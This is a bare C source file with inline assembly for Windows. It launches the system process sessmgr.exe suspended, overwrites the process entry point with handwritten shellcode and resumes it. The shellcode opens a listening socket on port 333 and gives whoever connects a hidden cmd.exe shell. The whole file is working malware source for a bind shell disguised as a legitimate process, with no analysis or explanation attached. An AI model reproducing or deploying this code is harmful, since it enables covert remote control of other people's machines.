#include <windows.h>
#include <winsock.h>
#include <stdlib.h>
#include <stdio.h>
#include <winsock.h>

void setfp(char *buffer,int sz,DWORD from,DWORD fp)
{
int i;
for(i=0;i<sz-5;i++)
if (buffer[i]=='\xb8'&&*(DWORD*)(buffer+i+1)==from)
{*(DWORD*)(buffer+i+1)=fp;break;}
}

int injcode(char *buffer)
{
HMODULE ws2_32;
DWORD _loadlibrarya,_createprocessa,_wsastartup,_wsasocketa,_bind,_listen,_accept,_sleep;
char *code;
int len;
ws2_32=LoadLibrary("ws2_32");
_loadlibrarya=(DWORD)GetProcAddress(GetModuleHandle("kernel32"),"LoadLibraryA");
_createprocessa=(DWORD)GetProcAddress(GetModuleHandle("kernel32"),"CreateProcessA");
_sleep=(DWORD)GetProcAddress(GetModuleHandle("kernel32"),"Sleep");
_wsastartup=(DWORD)GetProcAddress(ws2_32,"WSAStartup");
_wsasocketa=(DWORD)GetProcAddress(ws2_32,"WSASocketA");
_bind=(DWORD)GetProcAddress(ws2_32,"bind");
_listen=(DWORD)GetProcAddress(ws2_32,"listen");
_accept=(DWORD)GetProcAddress(ws2_32,"accept");

__asm
{
call over

push '23'
push '_2sw'
push esp
mov eax,0x11111111
call eax

xor ebx,ebx
push 0x64
pop ecx
wsadata:
push ebx
loop wsadata
push esp
push 0x101
mov eax,0x33333333
call eax

push ebx
push ebx
push ebx
push ebx
push SOCK_STREAM
push AF_INET
mov eax,0x44444444
call eax
mov esi,eax

push ebx
push ebx
push ebx
push 0x4D010002 /*port 333*/
mov eax,esp
push 0x10
push eax
push esi
mov eax,0x55555555
call eax

push SOMAXCONN
push esi
mov eax,0x66666666
call eax

push ebx
push ebx
push esi
mov eax,0x77777777
call eax
mov edi,eax

push ebx
push ebx
push ebx
push ebx
mov eax,esp
push edi
push edi
push edi
push ebx
push SW_HIDE
push STARTF_USESTDHANDLES
push 0xA
pop ecx
startupinfo:
push ebx
loop startupinfo
push 0x44
mov ecx,esp
push 'dmc'
mov edx, esp

push eax
push ecx
push ebx
push ebx
push ebx
push 1
push ebx
push ebx
push edx
push ebx
mov eax,0x22222222
call eax

push INFINITE
mov eax,0x88888888
call eax

over:
pop eax
mov code,eax
}

len=0xA0;
memcpy(buffer,code,len);
setfp(buffer,len,0x11111111,_loadlibrarya);
setfp(buffer,len,0x22222222,_createprocessa);
setfp(buffer,len,0x33333333,_wsastartup);
setfp(buffer,len,0x44444444,_wsasocketa);
setfp(buffer,len,0x55555555,_bind);
setfp(buffer,len,0x66666666,_listen);
setfp(buffer,len,0x77777777,_accept);
setfp(buffer,len,0x88888888,_sleep);

return len;
}

void main(void)
{
STARTUPINFO sinfo;
PROCESS_INFORMATION pinfo;
CONTEXT context;
LDT_ENTRY sel;
DWORD read,tib,peb,exebase,peoffs,ep;
IMAGE_NT_HEADERS pehdr;
int len;
char sessmgr[MAX_PATH+13];
char buffer[2048];

GetSystemDirectory(sessmgr,MAX_PATH);
sessmgr[MAX_PATH]=0;
strcat(sessmgr,"\\sessmgr.exe");
memset(&sinfo,0,sizeof(sinfo));
sinfo.cb=sizeof(sinfo);

if (!CreateProcess(sessmgr,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&sinfo,&pinfo))
printf("createprocess failed"), exit(1);

context.ContextFlags=CONTEXT_FULL;
GetThreadContext(pinfo.hThread,&context);
GetThreadSelectorEntry(pinfo.hThread,context.SegFs,&sel);
tib=sel.BaseLow|(sel.HighWord.Bytes.BaseMid<<16)|(sel.HighWord.Bytes.BaseHi<<24);
ReadProcessMemory(pinfo.hProcess,(LPCVOID)(tib+0x30),&peb,4,&read);
ReadProcessMemory(pinfo.hProcess,(LPCVOID)(peb+0x08),&exebase,4,&read);

ReadProcessMemory(pinfo.hProcess,(LPCVOID)(exebase+0x3C),&peoffs,4,&read);
ReadProcessMemory(pinfo.hProcess,(LPCVOID)(exebase+peoffs),&pehdr,sizeof(pehdr),&read);
ep=exebase+pehdr.OptionalHeader.AddressOfEntryPoint;

len=injcode(buffer);
VirtualProtect((LPVOID)ep,len,PAGE_EXECUTE_READWRITE,&read);
WriteProcessMemory(pinfo.hProcess,(LPVOID)ep,buffer,len,&read);

ResumeThread(pinfo.hThread);
}
